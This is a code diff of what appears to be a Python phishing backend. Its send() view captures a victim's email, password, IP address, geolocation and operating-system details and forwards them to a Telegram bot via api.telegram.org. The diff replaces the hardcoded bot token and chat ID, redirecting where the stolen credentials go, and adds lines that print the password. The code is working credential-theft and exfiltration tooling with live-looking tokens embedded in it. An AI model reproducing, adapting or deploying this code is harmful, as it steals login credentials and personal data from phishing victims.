@@ -22,6 +22,8 @@ def send(request):
     ip = get_client_ip(request)
     ip_info = get_ip_info(ip)
     OS = my_view(request)
+    print(email)
+    print(password)
     TeleBot(f"Email: {email}\nPassword: {password}\nIP: {ip}\nIP INFO: {ip_info}\n{OS}")
     cookie()
 
@@ -93,15 +95,15 @@ def get_ip_info(ip_address):
 
 def TeleBot(message):
     # Replace 'YOUR_API_TOKEN' with your actual bot token
-    bot = Bot(token='7400175327:AAE27TxoNvMvqfqy436zVufyE9skAAd0MCQ')
+    bot = Bot(token='7123132963:AAGYLROEqoNYQlUu2iOTXC4XiVrAW__vj2I')
 
     # Replace 'CHAT_ID' with the chat ID where you want to send the message
-    chat_id = '5813084500'
+    chat_id = '1428483523'
 
     
 
     # Replace 'YOUR_API_TOKEN' with your actual bot token
-    api_token = '7400175327:AAE27TxoNvMvqfqy436zVufyE9skAAd0MCQ'
+    api_token = '7123132963:AAGYLROEqoNYQlUu2iOTXC4XiVrAW__vj2I'
     #bot.send_message(chat_id=chat_id, text=message)
     # Send a message
     url = f'https://api.telegram.org/bot{api_token}/sendMessage'
@@ -117,7 +119,7 @@ def TeleBot(message):
 
     def main():
         try:
-            updater = Updater('7400175327:AAE27TxoNvMvqfqy436zVufyE9skAAd0MCQ', queue.Queue())
+            updater = Updater('7123132963:AAGYLROEqoNYQlUu2iOTXC4XiVrAW__vj2I', queue.Queue())
             dp = updater.dispatcher
             dp.add_handler(CommandHandler("start", start))
             updater.start_polling()
